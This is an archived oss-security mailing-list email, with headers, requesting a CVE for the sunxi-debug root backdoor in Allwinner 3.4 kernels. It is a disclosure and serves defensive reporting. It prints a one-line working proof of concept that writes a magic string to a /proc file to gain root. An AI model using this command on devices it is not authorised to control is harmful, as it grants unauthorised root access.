X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1726" "Wednesday" "5" "October" "2016" "13:45:02" "-0400" "David Manouchehri" "david.manouchehri@riseup.net" "<CAJEJqRz_5LVLYTd1eqEQQhu3jz=6+txBK7_OKZe6Lytov1dRSA@riseup.net>" "35" "[oss-security] CVE request: sunxi-debug (root privilege escalation in Allwinner kernel)" nil nil nil "10" "2016100517:45:02" "[oss-security] CVE request: sunxi-debug (root privilege escalation in Allwinner kernel)" (number mark "U       david.manouc Oct  5   35/1726  " thread-indent "\"[oss-security] CVE request: sunxi-debug (root privilege escalation in Allwinner kernel)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 4023 invoked by uid 550); 5 Oct 2016 18:11:26 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15880 invoked from network); 5 Oct 2016 17:45:31 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=riseup.net; s=squak;
	t=1475689519; bh=ZNk5FqJjJ0Xdx4oCIf3xhzT8H892Oppuier0u5NyK+w=;
	h=From:Date:Subject:To:Cc:From;
	b=X5W3cOWlfH5fs5pPdPjivCeQfi/paeNzXzySC4zjeLvUclsY68jzfOosyyYxs7+88
	 qoCZQE6HDNbILD1gtlJBPziP7es1MNjVl8fhCCQP5O9y7NsLBY6aJjMvxHRe4AX4li
	 XE6DHWDo5GDLr8i+nzcUqmeGhC9MDmw11grogu4s=
X-Gm-Message-State: AA6/9RkAeZarZhNZE3whwRGuyC0rPaXbhNwhZaMFHxS7BHWZ6glKARiqmlcMbDKfJ3dXf84xNQMQvjLo9VeycA==
X-Received: by 10.200.53.82 with SMTP id z18mr10595150qtb.82.1475689518252;
 Wed, 05 Oct 2016 10:45:18 -0700 (PDT)
MIME-Version: 1.0
From: David Manouchehri <david.manouchehri@riseup.net>
Date: Wed, 5 Oct 2016 13:45:02 -0400
X-Gmail-Original-Message-ID: <CAJEJqRz_5LVLYTd1eqEQQhu3jz=6+txBK7_OKZe6Lytov1dRSA@mail.gmail.com>
Message-ID: <CAJEJqRz_5LVLYTd1eqEQQhu3jz=6+txBK7_OKZe6Lytov1dRSA@riseup.net>
To: oss-security@lists.openwall.com, cve-assign@mitre.org
Cc: eva.wu@allwinnertech.com
Content-Type: multipart/alternative; boundary=001a113a7a1c88e044053e21bdf3
Subject: [oss-security] CVE request: sunxi-debug (root privilege escalation in Allwinner kernel)

--001a113a7a1c88e044053e21bdf3
Content-Type: text/plain; charset=UTF-8

The official Allwinner 3.4 kernels (H3, H8 and A83T) shipped a driver
called sunxi-debug, which allows any process (file permissions are set to
666) to escalate to root without any interaction.

Full PoC/"exploit" is simply:

echo "rootmydevice" > /proc/sunxi_debug/sunxi_debug

This was originally spotted in April 2016 and removed after media coverage
in May. If a CVE could be assigned to it, that would be appreciated.

Thanks,

David Manouchehri

References:

https://github.com/Manouchehri/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c#L41-L52
(The
original repository has had the backdoor erased from history.)
http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390
http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/
https://www.rapid7.com/db/modules/post/multi/escalate/allwinner_backdoor
http://www.theregister.co.uk/2016/05/09/allwinners_allloser_custom_kernel_has_a_nasty_root_backdoor/
http://arstechnica.com/security/2016/05/chinese-arm-vendor-left-developer-backdoor-in-kernel-for-android-pi-devices/
http://www.androidauthority.com/chinese-arm-vendor-left-developer-backdoor-in-kernel-for-android-692146/
http://news.softpedia.com/news/chinese-arm-chip-vendor-left-god-mode-feature-in-android-kernel-code-504037.shtml
https://www.heise.de/security/meldung/Allwinner-vergisst-Root-Cheatcode-im-Kernel-fuer-Sunxi-SoCs-3207356.html
https://news.ycombinator.com/item?id=11672590
https://olimex.wordpress.com/2016/05/10/how-to-root-any-allwinner-device-running-android-and-most-of-the-chinese-pi-clones-which-bet-on-allwinner-android-linux-kernel/

--001a113a7a1c88e044053e21bdf3--
